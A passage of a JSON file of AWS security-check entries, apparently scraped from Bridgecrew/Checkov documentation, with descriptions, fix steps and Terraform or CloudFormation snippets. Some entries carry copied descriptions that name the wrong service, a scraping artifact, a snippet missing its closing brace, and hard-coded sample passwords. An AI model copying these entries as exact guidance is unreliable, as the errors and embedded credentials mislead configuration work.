        "url": "https://docs.bridgecrew.io/docs/ensure-aws-acm-certificate-enables-create-before-destroy",
        "description": "AWS ACM certificate does not enable Create before Destroy\nDescription\nIt is recommended to enable create_before_destroy argument inside the resource lifecycle configuration block to avoid a possible outage when the certificate needs to be recreated during an update.\nFix - Buildtime\nCloudFormation\nCloudFormation creates a new certificate first and then will delete the old one automatically.\nTerraform\nGoresource \"aws_acm_certificate\" \"example\" {\n  domain_name       = \"example.com\"\n  validation_method = \"DNS\"\n\n+ lifecycle {\n+   create_before_destroy = true\n+ }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_215": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-appsync-api-cache-is-encrypted-in-transit",
        "description": "AWS Appsync API Cache is not encrypted in transit\nDescription\nThis policy identifies the AWS Appsync API that are configured with disabled in-transit data encryption. It is recommended that these resources will be configured with in-transit data encryption to minimize risk for sensitive data being leaked.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_appsync_api_cache\" \"pass\" {\n  api_id                     = aws_appsync_graphql_api.default.id\n  transit_encryption_enabled = true\n  at_rest_encryption_enabled = true\n  ttl                        = 60\n  type                       = \"SMALL\"\n  api_caching_behavior       = \"FULL_REQUEST_CACHING\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_201": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-memorydb-is-encrypted-at-rest-by-aws-key-management-service-kms-using-cmks",
        "description": "AWS MemoryDB is not encrypted at rest by AWS' Key Management Service KMS using CMKs\nDescription\nThis policy identifies MemoryDB which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your MemoryDB data. It gives you full control over the encrypted data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\n Resource: aws_memorydb_cluster\n Arguments: kms_key_arn\nGoresource \"aws_memorydb_cluster\" \"pass\" {\n  acl_name                 = \"open-access\"\n  name                     = \"my-cluster\"\n  node_type                = \"db.t4g.small\"\n  num_shards               = 2\n  security_group_ids       = [aws_security_group.example.id]\n  snapshot_retention_limit = 7\n  subnet_group_name        = aws_memorydb_subnet_group.example.id\n  kms_key_arn              = aws_kms_key.example.arn\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_220": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-cloudsearch-uses-https",
        "description": "AWS Cloudsearch does not use HTTPS\nDescription\nCloudSearch is a managed search service for your web service. CloudSearch Domains allow you to enforce that requests come over HTTPS, encrypting those requests.\nFix - Runtime\n\nIn the AWS Console, go to CloudSearch.\nSelect the domain you wish to edit.\nUnder Domain configuration, next to HTTPS options, select Edit.\nEnable Toggle HTTPS options.\nSelect Submit.\n\nFix - Buildtime\nTerraform\nresource \"aws_cloudsearch_domain\" \"example\" {\n...\n+   endpoint_options {\n+     enforce_https = true\n+   }\n...\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_239": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-dax-cluster-endpoint-uses-transport-layer-security-tls",
        "description": "AWS DAX cluster endpoint does not use TLS (Transport Layer Security) \nDescription\nThe Transport Layer Security (TLS) protocol secures transmission of data between servers and web browsers, over the Internet, using standard encryption technology. To follow security best practices and the latest PCI compliance standards, enable the latest version of TLS protocol (i.e. TLS 1.2) for all yourDAX Servers.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_dax_cluster\" \"pass\" {\n  cluster_name                     = var.cluster_name\n  iam_role_arn                     = var.iam_role_arn\n  parameter_group_name             = aws_dax_parameter_group.example.name\n  subnet_group_name                = aws_dax_subnet_group.example.name\n  cluster_endpoint_encryption_type = \"TLS\"\n  server_side_encryption {\n    enabled = false #default is false\n  }\n  tags = { test = \"Fail\" }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_206": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-api-gateway-domain-uses-a-modern-security-policy",
        "description": "AWS API Gateway Domain does not use a modern security policy\nDescription\nAWS API Gateway Domain allows you to set the security policy. Using TLS 1_0 allows you to use insecure cypher suites.\nFix - Runtime\n\nIn the AWS console, go to API Gateway.\nSelect Custom Domain Names.\nSelect the domain name to update and then Edit.\nFor Minimum TLS version, select TLS 1.2.\nSelect Save.\n\nFix - Buildtime\nTerraform\nresource \"aws_api_gateway_domain_name\" \"example\" {\n...\n  + security_policy = TLS_1_2\n...\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_204": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-amis-are-encrypted-by-key-management-service-kms-using-customer-managed-keys-cmks",
        "description": "AWS AMIs are not encrypted by Key Management Service (KMS) using Customer Managed Keys (CMKs)\nDescription\nThis policy identifies AMIs which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your EFS data. It gives you full control over the encrypted data.\nFix - Runtime\nFix - Buildtime\nTerraform\nGo75 lines (62 sloc)  1.41 KB\n\nresource \"aws_ami\" \"pass\" {\n  name                = \"terraform-example\"\n  virtualization_type = \"hvm\"\n  root_device_name    = \"/dev/xvda1\"\n\n  ebs_block_device {\n    device_name = \"/dev/xvda1\"\n    volume_size = 8\n    snapshot_id = \"someid\"\n  }\n\n  ebs_block_device {\n    device_name = \"/dev/xvda2\"\n    volume_size = 8\n    encrypted   = true\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_247": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-all-data-stored-in-the-elasticsearch-domain-is-encrypted-using-a-customer-managed-key-cmk",
        "description": "Note all AWS data stored in the Elasticsearch domain is encrypted using a Customer Managed Key (CMK)\nDescription\nThis policy identifies Elasticsearch domain which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your Elasticsearch domain data. It gives you full control over the encrypted data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\nGoresource \"aws_elasticsearch_domain\" \"pass\" {\n  domain_name = \"example\"\n\n  cluster_config {\n    instance_type = \"r5.large.elasticsearch\"\n  }\n\n  encrypt_at_rest {\n    kms_key_id = aws_kms_key.example.arn\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_205": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-ami-launch-permissions-are-limited",
        "description": "AWS AMI launch permissions are not limited\nDescription\nIt is recommended not to give the ability to launch AMIs across multiple accounts, and if it is implemented, make sure it is properly used.\nFix - Runtime\nTBA \nFix - Buildtime\nTerraform\nGo- resource \"aws_ami_launch_permission\" \"remove_equivalent_block\" {\n-   image_id   = \"ami-2345678\"\n-   account_id = \"987654321\"\n- }\n",
        "severity": "LOW"
    },
    "CKV_AWS_266": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-rds-db-snapshot-uses-customer-managed-keys-cmks",
        "description": "AWS RDS DB snapshot does not use Customer Managed Keys (CMKs)\nDescription\nThis policy identifies database snapshots that were not encrypted with KMS. It is a best practice to manage your own encryption keys for all storage volumes and snapshots.\nFix - Runtime\nChanging the encryption method cannot be done for existing snapshots. Instead, create a new snapshot and add the CMK encryption.\n\nOpen the Amazon RDS console.\nIn the navigation pane, choose Databases.\nChoose the DB instance for which you want to create a manual snapshot.\nCreate a manual snapshot for your DB instance.\nIn the navigation pane, choose Snapshots.\nSelect the manual snapshot that you created.\nChoose Actions, and then choose Copy Snapshot.\nUnder Encryption, select Enable Encryption.\nFor AWS KMS Key, choose the new encryption key that you want to use.\nChoose Copy snapshot.\nRestore the copied snapshot.\n\nFix - Buildtime\nTerraform\n\nResource: aws_db_snapshot_copy\nArgument: kms_key_id\n\nGoresource \"aws_db_snapshot_copy\" \"pass\" {\n  source_db_snapshot_identifier = aws_db_snapshot.example.db_snapshot_arn\n  target_db_snapshot_identifier = \"testsnapshot1234-copy\"\n+  kms_key_id= aws_kms_key.example.id\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_241": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-kinesis-firehose-delivery-streams-are-encrypted-with-cmk",
        "description": "AWS Kinesis Firehose Delivery Streams are not encrypted with CMK\nDescription\nThis policy identifies Elastic File Systems (EFSs) which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your EFS data. It gives you full control over the encrypted data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\n Resource: aws_kinesis_firehose_delivery_stream\n Arguments: s3_configuration.server_side_encryption.key_arn\nGoresource \"aws_kinesis_firehose_delivery_stream\" \"pass\" {\n  name        = \"terraform-kinesis-firehose-test-stream\"\n  destination = \"s3\"\n\n  s3_configuration {\n    role_arn   = aws_iam_role.firehose_role.arn\n    bucket_arn = aws_s3_bucket.bucket.arn\n  }\n\n   server_side_encryption {\n     enabled=true #default is false\n     key_type = \"CUSTOMER_MANAGED_CMK\"\n     key_arn = aws_kms_key.example.arn\n   }\n  tags = {\n    test = \"failed\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_221": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-code-artifact-domain-is-encrypted-by-kms-using-a-customer-managed-key-cmk",
        "description": "AWS Code Artifact Domain is not encrypted by KMS using a Customer Managed Key (CMK)\nDescription\nThis policy identifies Code Artifact Domains which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your Code Artifact Domain data. It gives you full control over the encrypted data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\nGoresource \"aws_codeartifact_domain\" \"pass\" {\n  domain         = \"example\"\n  encryption_key = aws_kms_key.example.arn\n  tags = {\n    \"key\" = \"value\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_240": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-kinesis-firehoses-delivery-stream-is-encrypted",
        "description": "Ensure AWS Kinesis Firehose's delivery stream is encrypted\nDescription\nAs a best practice enable encryption for your AWS Kinesis Firehose's delivery stream to improve data security without making changes to your business or applications.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_kinesis_firehose_delivery_stream\" \"pass\" {\n  name        = \"terraform-kinesis-firehose-test-stream\"\n  destination = \"s3\"\n\n  s3_configuration {\n    role_arn   = aws_iam_role.firehose_role.arn\n    bucket_arn = aws_s3_bucket.bucket.arn\n  }\n\n  server_side_encryption {\n    enabled = true #default is false\n  }\n  tags = {\n    test = \"failed\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_245": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-dms-instance-receives-all-minor-updates-automatically",
        "description": "AWS DMS instance does not receive all minor updates automatically\nDescription\nWhen AWS Database Migration Service (AWS DMS) supports a new version, you can upgrade your replication instances to it. There are two kinds of upgrades: major version upgrades and minor version upgrades. Minor upgrades helps maintain a secure and stable DMS with minimal impact on the replication. For this reason, we recommend that your automatic minor upgrade is enabled. Minor version upgrades only occur automatically if a minor upgrade replaces an unsafe version, such as a minor upgrade that contains bug fixes for a previous version.\nFix - Runtime\nCLI Command\nShellaws dms modify-replication-instance \\\n    --region ${region} \\\n    --replication-instance-arn ${resource_arn} \\\n    --auto-minor-version-upgrade \\\n    --apply-immediately\n\nFix - Buildtime\nCloudFormation\nYAMLResources:\n  Example:\n    Type: 'AWS::DMS::ReplicationInstance'\n    Properties:\n      EngineVersion: 3.1.4\n      ReplicationInstanceIdentifier: example\n      ReplicationInstanceClass: dms.t2.micro\n+     AutoMinorVersionUpgrade: true\n\nTerraform\nGoresource \"aws_dms_replication_instance\" \"example\" {\n  engine_version               = \"3.1.4\"\n  replication_instance_class   = \"dms.t2.micro\"\n  replication_instance_id      = \"example\"\n+ auto_minor_version_upgrade   = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_224": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-cluster-logging-is-encrypted-using-a-customer-managed-key-cmk",
        "description": "AWS cluster logging is not encrypted using a Customer Managed Key (CMK)\nDescription\nThis policy identifies cluster logging which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your cluster logging data. It gives you full control over the encrypted data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\nTextresource \"aws_ecs_cluster\" \"pass2\" {\n  name = \"white-hart\"\n  configuration {\n    execute_command_configuration {\n      kms_key_id = aws_kms_key.example.arn\n\n      log_configuration {\n        #        cloud_watch_encryption_enabled = true\n        # cloud_watch_log_group_name     = aws_cloudwatch_log_group.example.name\n\n        # or\n        # s3_bucket_name=   and\n        s3_bucket_encryption_enabled = true\n      }\n    }\n  }\n  tags = { test = \"fail\" }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_214": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-appsync-api-cache-is-encrypted-at-rest",
        "description": "AWS Appsync API Cache is not encrypted at rest\nDescription\nEncryption of data at rest is a security feature that helps prevent unauthorized access to your data. The feature uses AWS Key Management Service (AWS KMS) to store and manage your encryption keys and the Advanced Encryption Standard algorithm with 256-bit keys (AES-256) to perform the encryption. If enabled, the feature encrypts the domain's: indices, logs, swap files, all data in the application directory, and automated snapshots.\nWe recommend you implement encryption at rest in order to protect a data store containing sensitive information from unauthorized access, and fulfill compliance requirements.\nFix - Runtime\nFix - Buildtime\nGoresource \"aws_appsync_api_cache\" \"pass\" {\n  api_id                     = aws_appsync_graphql_api.default.id\n  transit_encryption_enabled = true\n  at_rest_encryption_enabled = true\n  ttl                        = 60\n  type                       = \"SMALL\"\n  api_caching_behavior       = \"FULL_REQUEST_CACHING\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_193": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-appsyncs-logging-is-enabled",
        "description": "AWS AppSync's logging is disabled\nDescription\nIt is recommended to have a proper logging process for AWS AppSync in order to track configuration changes conducted manually and programmatically and trace back unapproved changes.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_appsync_graphql_api\" \"enabled\" {\n  authentication_type = \"API_KEY\"\n  name                = \"example\"\n\n  log_config {\n    cloudwatch_logs_role_arn = \"aws_iam_role.example.arn\"\n    field_log_level          = \"ERROR\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_196": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-elasticache-security-groups-are-defined",
        "description": "AWS Elasticache security groups are not defined\nDescription\nBy ensuring that AWS Elasticache security groups are defined, you can help protect your clusters from unauthorized access and ensure that only authorized traffic is allowed to reach your clusters. This can help prevent data breaches and other security incidents, and can also help ensure that your clusters are not overwhelmed by unwanted traffic.\nFix - Buildtime\nTerraform\nGoresource \"aws_elasticache_security_group\" \"exists\" {\n  name                 = \"elasticache-security-group\"\n  security_group_names = [aws_security_group.bar.name]\n}\n\nresource \"aws_security_group\" \"bar\" {\n  name = \"security-group\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_200": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-image-recipe-ebs-disk-are-encrypted-using-a-customer-managed-key-cmk",
        "description": "AWS Image Recipe EBS Disk are not encrypted using a Customer Managed Key (CMK)\nDescription\nThis policy identifies Image Recipe EBS Disks which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your EFS data. It gives you full control over the encrypted data.\nFix - Runtime\nTBA\nFix - Buildtime\nTerraform\nGoresource \"aws_imagebuilder_image_recipe\" \"pass2\" {\n  block_device_mapping {\n    device_name = \"/dev/xvdb\"\n\n    ebs {\n      encrypted             = true\n      kms_key_id            = aws_kms_key.fail.arn\n      delete_on_termination = true\n      volume_size           = 100\n      volume_type           = \"gp2\"\n    }\n  }\n\n  component {\n    component_arn = aws_imagebuilder_component.fail.arn\n  }\n\n  name         = \"example\"\n  parent_image = \"arn:${data.aws_partition.current.partition}:imagebuilder:${data.aws_region.current.name}:aws:image/amazon-linux-2-x86/x.x.x\"\n  version      = \"1.0.0\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_208": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-mqbroker-version-is-up-to-date",
        "description": "AWS MQBroker version is not up to date\nDescription\nThis test examines the value of engine version for MQ, and flags if the version is less than the minimum required:\nversionsminimumActiveMQ = 5.16\nminimumRabbitMQ = 3.8\n\nCurrent versions supported can be found here:\nhttps://docs.aws.amazon.com/amazon-mq/latest/developer-guide/activemq-version-management.html\nhttps://docs.aws.amazon.com/amazon-mq/latest/developer-guide/rabbitmq-version-management.html\nFix - Runtime\nFix - Buildtime\nTerraform\nModify the engine version in either aws_mq_configuration or aws_mq_broker, to be higher or equal to the minimums:\nGoresource \"aws_mq_configuration\" \"example\" {\n  description    = \"Example Configuration\"\n  name           = \"example\"\n  engine_type    = \"ActiveMQ\"\n + engine_version = \"5.17.1\"\n\n  data = <<DATA\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<broker xmlns=\"http://activemq.apache.org/schema/core\">\n  <plugins>\n    <forcePersistencyModeBrokerPlugin persistenceFlag=\"true\"/>\n    <statisticsBrokerPlugin/>\n    <timeStampingBrokerPlugin ttlCeiling=\"86400000\" zeroExpirationOverride=\"86400000\"/>\n  </plugins>\n</broker>\nDATA\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_249": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-appsync-has-field-level-logs-enabled",
        "description": "AWS AppSync has field-level logs disabled\nDescription\nIt is recommended to have a proper logging process for AWS AppSync in order to detect anomalous configuration activity. It is used to track configuration changes conducted manually and programmatically and trace back unapproved changes.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_appsync_graphql_api\" \"all\" {\n  authentication_type = \"API_KEY\"\n  name                = \"example\"\n\n  log_config {\n    cloudwatch_logs_role_arn = \"aws_iam_role.example.arn\"\n    field_log_level          = \"ALL\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_211": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-rds-uses-a-modern-cacert",
        "description": "AWS RDS does not use a modern CaCert\nDescription\nBy ensuring that your AWS RDS uses a modern CA certificate, you can help ensure that the certificate used to secure connections to your database is up to date and free of known vulnerabilities. This can help protect your database from potential attacks and improve the overall security of your system.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_db_instance\" \"pass\" {\n  allocated_storage                   = 20\n  storage_type                        = \"gp2\"\n  engine                              = \"mysql\"\n  engine_version                      = \"5.7\"\n  instance_class                      = \"db.t2.micro\"\n  name                                = \"mydb\"\n  username                            = \"foo\"\n  password                            = \"foobarbaz\"\n  iam_database_authentication_enabled = true\n  storage_encrypted                   = true\n  ca_cert_identifier                  = \"rds-ca-2019\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_199": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-image-builder-distribution-configuration-is-encrypting-ami-by-key-management-service-kms-using-a-customer-managed-key-cmk",
        "description": "AWS Image Builder Distribution Configuration is not encrypting AMI by Key Management Service (KMS) using a Customer Managed Key (CMK)\nDescription\nThis policy identifies Elastic File Systems (EFSs) which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your EFS data. It gives you full control over the encrypted data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\n Resource: aws_imagebuilder_distribution_configuration\n Arguments: distribution.ami_distribution_configuration.kms_key_id \nGoresource \"aws_imagebuilder_distribution_configuration\" \"pass\" {\n  name        = \"example\"\n  description = \"non empty value\"\n\n  distribution {\n    ami_distribution_configuration {\n      kms_key_id = aws_kms_key.fail.arn\n      ami_tags = {\n        CostCenter = \"IT\"\n      }\n\n      name = \"example-{{ imagebuilder:buildDate }}\"\n\n      launch_permission {\n        user_ids = [\"123456789012\"]\n      }\n    }\n\n    region = \"us-east-1\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_236": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-ami-copying-uses-a-customer-managed-key-cmk",
        "description": "AWS AMI copying does not use a Customer Managed Key (CMK)\nDescription\nThis policy identifies AMI copies which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer-managed KMS Keys to encrypt your AMI copies data. It gives you full control over the encrypted data.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_ami_copy\" \"pass\" {\n  name              = \"terraform-example\"\n  description       = \"A copy of ami-xxxxxxxx\"\n  source_ami_id     = \"ami-xxxxxxxx\"\n  source_ami_region = \"us-west-1\"\n  encrypted         = true #default is false\n  kms_key_id        = aws_kms_key.copy.arn\n  tags = {\n    Name = \"HelloWorld\"\n    test = \"failed\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_244": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-mwaa-environment-has-webserver-logs-enabled",
        "description": "AWS MWAA environment has webserver logs disabled\nDescription\nIt is recommended to have a proper logging process for AWS MWAA environment webserver in order to track configuration changes conducted manually and programmatically and trace back unapproved changes.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_mwaa_environment\" \"pass\" {\n  dag_s3_path        = \"dags/\"\n  execution_role_arn = \"aws_iam_role.example.arn\"\n\n  logging_configuration {\n    dag_processing_logs {\n      enabled   = true\n      log_level = \"DEBUG\"\n    }\n\n    webserver_logs {\n      enabled   = true\n      log_level = \"INFO\"\n    }\n  }\n\n  name = \"example\"\n\n   network_configuration {\n    security_group_ids = [\"aws_security_group.example.id\"]\n    subnet_ids         = \"aws_subnet.private[*].id\"\n  }\n\n  source_bucket_arn = \"aws_s3_bucket.example.arn\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_265": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-keyspace-table-uses-customer-managed-keys-cmks",
        "description": "AWS Keyspace Table does not use Customer Managed Keys (CMKs)\nDescription\nThis policy identifies Keyspace Tables which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your Keyspace Table data. It gives you full control over the encrypted data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\n Resource: aws_keyspaces_table\n Arguments: encryption_specification.kms_key_identifier\nGoresource \"aws_keyspaces_table\" \"pass\" {\n  keyspace_name = aws_keyspaces_keyspace.example.name\n  table_name    = \"my_table\"\n\n  schema_definition {\n    column {\n      name = \"Message\"\n      type = \"ASCII\"\n    }\n\n    partition_key {\n      name = \"Message\"\n    }\n  }\n  encryption_specification {\n    kms_key_identifier=aws_kms_key.example.arn\n    type=\"CUSTOMER_MANAGED_KEY\"\n  }\n",
        "severity": "LOW"
    },
    "CKV_AWS_197": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-mqbroker-audit-logging-is-enabled",
        "description": "AWS MQBroker audit logging is disabled\nDescription\nIt is recommended to have a proper logging process for AWS MQBroke in order to track configuration changes conducted manually and programmatically and trace back unapproved changes.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_mq_broker\" \"enabled\" {\n  broker_name        = \"example\"\n  engine_type        = \"ActiveMQ\"\n  engine_version     = \"5.16.3\"\n  host_instance_type = \"mq.t3.micro\"\n\n  user {\n    password = \"admin123\"\n    username = \"admin\"\n  }\n\n  logs {\n    general = true\n    audit   = true\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_237": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-api-gateway-enables-create-before-destroy",
        "description": "AWS API Gateway does not enable Create before Destroy\nDescription\nIt is recommended to enable create_before_destroy argument inside the resource lifecycle configuration block to avoid a possible outage when the API Gateway needs to be recreated during an update.\nFix - Buildtime\nCloudFormation\nCloudFormation creates a new API Gateway first and then will delete the old one automatically.\nTerraform\nGoresource \"aws_api_gateway_rest_api\" \"example\" {\n  name = \"example\"\n\n+ lifecycle {\n+   create_before_destroy = true\n+ }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_222": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-dms-instance-receives-all-minor-updates-automatically",
        "description": "AWS DMS instance does not receive all minor updates automatically\nDescription\nWhen AWS Database Migration Service (AWS DMS) supports a new version, you can upgrade your replication instances to it. There are two kinds of upgrades: major version upgrades and minor version upgrades. Minor upgrades helps maintain a secure and stable DMS with minimal impact on the replication. For this reason, we recommend that your automatic minor upgrade is enabled. Minor version upgrades only occur automatically if a minor upgrade replaces an unsafe version, such as a minor upgrade that contains bug fixes for a previous version.\nFix - Runtime\nCLI Command\nShellaws dms modify-replication-instance \\\n    --region ${region} \\\n    --replication-instance-arn ${resource_arn} \\\n    --auto-minor-version-upgrade \\\n    --apply-immediately\n\nFix - Buildtime\nCloudFormation\nYAMLResources:\n  Example:\n    Type: 'AWS::DMS::ReplicationInstance'\n    Properties:\n      EngineVersion: 3.1.4\n      ReplicationInstanceIdentifier: example\n      ReplicationInstanceClass: dms.t2.micro\n+     AutoMinorVersionUpgrade: true\n\nTerraform\nGoresource \"aws_dms_replication_instance\" \"example\" {\n  engine_version               = \"3.1.4\"\n  replication_instance_class   = \"dms.t2.micro\"\n  replication_instance_id      = \"example\"\n+ auto_minor_version_upgrade   = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_251": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-cloudtrail-logging-is-enabled",
        "description": "AWS CloudTrail logging is disabled\nDescription\nIt is recommended to have a proper logging process for AWS CloudTrail in order to track configuration changes conducted manually and programmatically and trace back unapproved changes.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_cloudtrail\" \"pass\" {\n  name                          = \"TRAIL\"\n  s3_bucket_name                = aws_s3_bucket.test.id\n  include_global_service_events = true\n  enable_logging = true\n  kms_key_id                    = aws_kms_key.test.arn\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_203": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-fsx-openzfs-file-system-is-encrypted-by-aws-key-management-service-kms-using-a-customer-managed-key-cmk",
        "description": "AWS FSX openzfs is not encrypted by AWS' Key Management Service (KMS) using a Customer Managed Key (CMK)\nDescription\nThis policy identifies  FSX openzfs file systems which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your  FSX openzfs file system data. It gives you full control over the encrypted data.\nFix - Runtime\nFix - Buildtime\nTerraform\n Resource: aws_fsx_openzfs_file_system\n Arguments: kms_key_id\nGoresource \"aws_fsx_openzfs_file_system\" \"pass\" {\n  storage_capacity                = var.file_system.storage_capacity\n  subnet_ids                      = var.subnet_ids\n  deployment_type                 = var.file_system.deployment_type\n  throughput_capacity             = var.file_system.throughput_capacity\n  kms_key_id                      = var.kms_key_id\n  automatic_backup_retention_days = 0 #flag as no bckup\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_202": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-memorydb-data-is-encrypted-in-transit",
        "description": "AWS MemoryDB data is not encrypted in transit\nDescription\nThis policy identifies the AWS MemoryDB  that are configured with disabled in-transit data encryption. It is recommended that these resources will be configured with in-transit data encryption to minimize risk for sensitive data being leaked.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_memorydb_cluster\" \"pass2\" {\n  acl_name                 = \"open-access\"\n  name                     = \"my-cluster\"\n  node_type                = \"db.t4g.small\"\n  num_shards               = 2\n  security_group_ids       = [aws_security_group.example.id]\n  snapshot_retention_limit = 7\n  subnet_group_name        = aws_memorydb_subnet_group.example.id\n  tls_enabled              = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_207": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-mqbrokers-minor-version-updates-are-enabled",
        "description": "AWS MQ Broker's minor version updates are disabled\nDescription\nWhen Amazon MQ supports a new version of a broker engine, you can upgrade your broker instances to the new version. There are two kinds of upgrades: major version upgrades and minor version upgrades. Minor upgrades helps maintain a secure and stable MQ broker with minimal impact on the application. For this reason, we recommend that your automatic minor upgrade is enabled. Minor version upgrades only occur automatically if a minor upgrade replaces an unsafe version, such as a minor upgrade that contains bug fixes for a previous version.\nFix - Runtime\nCLI Command\nShellaws mq update-broker \\\n  --region ${region} \\\n  --broker-id ${resource_id} \\\n  --auto-minor-version-upgrade\n\nFix - Buildtime\nCloudFormation\nYAMLResources: \n  Example:\n    Type: \"AWS::AmazonMQ::Broker\"\n    Properties:\n      BrokerName: example\n      EngineType: ActiveMQ\n      EngineVersion: \"5.15.9\"\n      HostInstanceType: mq.t3.micro\n+     AutoMinorVersionUpgrade: true\n\nTerraform\nGoresource \"aws_mq_broker\" \"example\" {\n  broker_name                = \"example\"\n  engine_type                = \"ActiveMQ\"\n  engine_version             = \"5.15.9\"\n  host_instance_type         = \"mq.t3.micro\"\n+ auto_minor_version_upgrade = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_252": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-cloudtrail-defines-an-sns-topic",
